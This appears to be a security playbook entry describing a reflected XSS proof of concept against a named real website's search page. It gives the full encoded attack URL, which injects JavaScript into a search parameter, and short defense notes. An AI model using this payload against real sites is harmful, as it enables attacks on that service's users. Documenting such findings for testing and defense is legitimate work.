---
tags:
  - xss
  - execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:15.862Z'
sub_techniques: []
id: 4fa79d14-b2cd-4211-a6ca-e18283943dbe
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
---

# Execute-Reflected-XSS-Payload

## Summary

This procedure delivers the crafted XSS payload via the search URL, triggering JavaScript execution in the victim's browser to demonstrate the vulnerability.

## Description

In the final exploitation phase, the encoded payload is appended to the Equifax search URL and loaded in a browser. This simulates a phishing or drive-by attack where victims search with the malicious query. Execution results in an alert, proving capability for further attacks like cookie theft. Requires only a browser; validates the full chain.

## Requirements

1. Crafted payload from previous step
2. Web browser
3. Target URL access

## Defense

Defensive measures and detection strategies:

- Deploy strict CSP headers to block eval/map executions
- Sanitize all reflected parameters server-side
- User education on suspicious URLs

## Objectives

1. Trigger the injected JavaScript
2. Observe execution effects
3. Confirm impact like arbitrary code run

## Instructions

### Step 1: Construct Malicious URL

**Context**: Combine base URL with encoded payload.

**Instructions**: Form the full URL: https://www.equifax.com/personal/search?q=%22%20%2C%20internalSearchTerm%3A%20%5B%22broook%22%5D.map%28alert%29%20%2C%20numOfSearchResultsReturned%3A%20%22b

> Paste into browser address bar.

### Step 2: Load and Verify Execution

**Context**: Observe the page load and any popups.

**Instructions**: Press Enter to load; watch for alert dialog.

> Expected: Alert popup with 'broook' or undefined, confirming XSS success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[exploit]]
